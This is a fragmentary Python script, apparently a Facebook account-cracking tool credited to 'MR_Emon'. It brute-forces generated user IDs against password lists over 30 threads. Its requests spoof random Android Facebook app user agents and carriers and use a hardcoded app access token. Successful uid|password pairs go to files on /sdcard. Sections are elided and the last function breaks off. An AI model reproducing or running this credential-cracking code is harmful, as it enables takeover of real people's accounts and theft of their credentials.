...
\33[1;91m_________ _______  _        _______  _______ 
\33[1;92m\__    _/(  ___  )| \    /\(  ____ \(  ____ )
   )  (  | (   ) ||  \  / /| (    \/| (    )|
\33[1;94m  |  |  | |   | ||  (_/ / | (__    | (____)|
   |  |  | |   | ||   _ (  |  __)   |     __)
   |  |  | |   | ||  ( \ \ | (      | (\ (   
\33[1;93m|\_)  )  | (___) ||  /  \ \| (____/\| ) \ \__
\33[1;94m(____/   (_______)|_/    \/(_______/|/   \__/                                                                                                                                                  
----------------------------------------------
☆AUTHER   : MR_Emon
☆TEAM     : MR Emon Khan
☆BROTHER : MR_Emon
☆Facebook : Em On
☆MR_Emon    : MR Emon Khan
☆TOOLS    : FREE + MR_Emon 
------------------------------------------------
\033[1: VERSION : 1.0 
------------------------------------------------
...
def MR_Emonafghan():
		...
		for nmbr in range(limit):
			...
			user.append(nmp)
		with tred(max_workers=30) as MR_Emon:	
			clear()
			tl = str(len(user))
			...
			for psx in user:
				...
				if mthd in ['1','01']:
					MR_Emon.submit(rndm,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def MR_Emonafghan1():
		...
		with tred(max_workers=30) as MR_Emon:	
			...
			for psx in user:
				...
				if mthd in ['1','01']:
					MR_Emon.submit(rndm2,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
enMR_Emon1 = ['en_GB','en_US']
MR_Emonfban1 = [ 'MessengerLite', 'MobileAdsManagerAndroid', 'Orca-Android', 'FB4A', 'FB4A']
MR_Emonsim1 = [ 'MTN', 'AWCC', 'Roshan', 'Zong','Jazz','Etisalat']
...
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [MR_Emon-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                accessToken="350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                                MR_Emonsim = random.choice(MR_Emonsim1)
                                gtt=random.choice(modelxxx)
                                enMR_Emon=random.choice(enMR_Emon1)
                                MR_Emonfban=random.choice(MR_Emonfban1)
                                gttt=random.choice(modelxxx)
                                android_version=str(random.randrange(6,13))
                                MR_Emon_ua = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gttt)} Build/{str(gtt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.25,height=1024,width=2048};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/{str(MR_Emonsim)};FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/MR_Emon-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [MR_Emon-OK] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        open('/sdcard/MR_Emon-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [MR_Emon-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/MR_Emon-OK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
...
def rndm2(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;32m [MR_Emon-M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
